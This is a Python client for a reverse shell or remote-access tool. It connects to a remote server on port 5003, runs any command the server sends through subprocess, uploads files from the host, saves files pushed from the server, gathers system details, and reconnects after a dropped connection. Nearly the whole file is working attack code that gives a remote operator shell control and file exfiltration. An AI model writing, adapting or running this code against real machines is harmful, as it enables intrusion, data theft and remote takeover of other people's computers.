import os
import time
import platform
import math
from datetime import datetime

import socket
import subprocess
import psutil
import colorama
from colorama import Fore
colorama.init(autoreset=True)

# Server info for connection making and message sending.
SERVER_HOST = ""
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages
SEPARATOR = "<sep>"

# Convert bytes to Kilobytes, Megabytes, Etc.
def get_size(bytes, suffix='B'):
    if bytes == 0:
       return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(bytes, 1024)))
    p = math.pow(1024, i)
    s = round(bytes / p, 2)
    return "%s %s" % (s, size_name[i])
# Whitelist/blacklist detection, connect to server and send cwd to server.
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
is_allowed = s.recv(BUFFER_SIZE).decode()
if is_allowed == "blacklisted":
    print(Fore.RED + "You have been kicked from server as you were blacklisted.")
    s.close()
else:
    cwd = os.getcwd()
    s.send(cwd.encode())
    recon_count = 0

    # Main loop
    while True:
        try:
            # Recive and execute commands.
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                break
            elif recon_count >= 5:
                break
            elif command.lower() == "upload":
                # Recive file name and prepare to upload.
                filename = s.recv(BUFFER_SIZE).decode()
                filesize = os.path.getsize(filename)
                s.send(f"{filename}{SEPARATOR}{filesize}".encode())

                # Upload file to server.
                with open(filename, "rb") as f:
                    bytes_read = f.read(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    s.sendall(bytes_read)
            elif command.lower() == "download":    
                # Recive data from server.
                fl_outp = s.recv(BUFFER_SIZE).decode()
                filename2, filesize2 = fl_outp.split(SEPARATOR)
                filename2 = os.path.basename(filename2)
                filesize2 = float(filesize2)

                # Upload file to cwd.
                with open(filename2, "wb") as f:
                    bytes_read = s.recv(BUFFER_SIZE)
                    if not bytes_read:    
                        break
                    f.write(bytes_read)
            elif command.lower() == "sysinf":
                # Get system info.
                uname = platform.uname()
                cpufreq = psutil.cpu_freq()
                svmem = psutil.virtual_memory()
                boot_time_stamp = psutil.boot_time()
                bt = datetime.fromtimestamp(boot_time_stamp)

                # Send info to server.
                cwd = os.getcwd()
                sysinfo = "="*20 + "GENERAL" + "="*20 + f"\nOS: {uname.node} {uname.system} {uname.release} {uname.version}\nMachine: {uname.machine}\nProcessor: {uname.processor}\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n\n" + "="*20 + "CPU" + "="*20 + "\nPhysical Cores: ", psutil.cpu_count(logical=False), "\n", "Total Cores: ", psutil.cpu_count(logical=True), f"\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\nCurrent Frequency: {cpufreq.current:.2f}Mhz\n\n", "="*20 + "MEMORY" + "="*20, f"\nTotal: {get_size(svmem.total)}\nAvailable: {get_size(svmem.available)}\nUsed: {get_size(svmem.used)}\nPercentage: {svmem.percent}%"
                message = f"{sysinfo}{SEPARATOR}{cwd}"
                s.send(message.encode())
                
            elif command.lower() == "msg":
                recv_message = s.recv(BUFFER_SIZE).decode()
                print()
                print(Fore.CYAN + recv_message)
                print()
                time.sleep(0.5)
                resp = input("Do you want to respond? Y/N: ")
                s.send(resp.encode())
                if resp.lower() == "y" or resp.lower() == "yes":
                    cwd = os.getcwd()
                    send_msg = input("Respond: ")
                    s.send(send_msg.encode())
                else:
                    continue
            # Test for "cd" command.
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            # Test for custom comands, send only system command output to server.
            elif command.lower() == "upload":
                output = ""
                continue
            elif command.lower() == "download":
                output = ""
                continue
            elif command.lower() == "sysinf":
                output = ""
                continue
            elif command.lower() == "msg":
                output = ""
                continue
            elif command.lower() == "help":
                output = ""
                continue
            else:
                output = subprocess.getoutput(command)

            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())

        # Attempt to reconect if an exception occures in the connection.
        except ConnectionError as ce:
            connected = False
            print(Fore.RED +  f"Socket Disconected with error: {ce}")
            print(Fore.RED + "Atempting to reconnect...")

            # Make sure client is whitelisted before attempting reconnect
            if is_allowed == "whitelisted":
                while not connected:
                    try:
                        s = socket.socket()
                        s.connect((SERVER_HOST, SERVER_PORT))
                        print(Fore.GREEN + "Reconnection was successful!")
                        connected = True
                    except ConnectionRefusedError:
                        print(Fore.RED + "Could not connect to server, Quiting...")
                        break
                break
    s.close()       
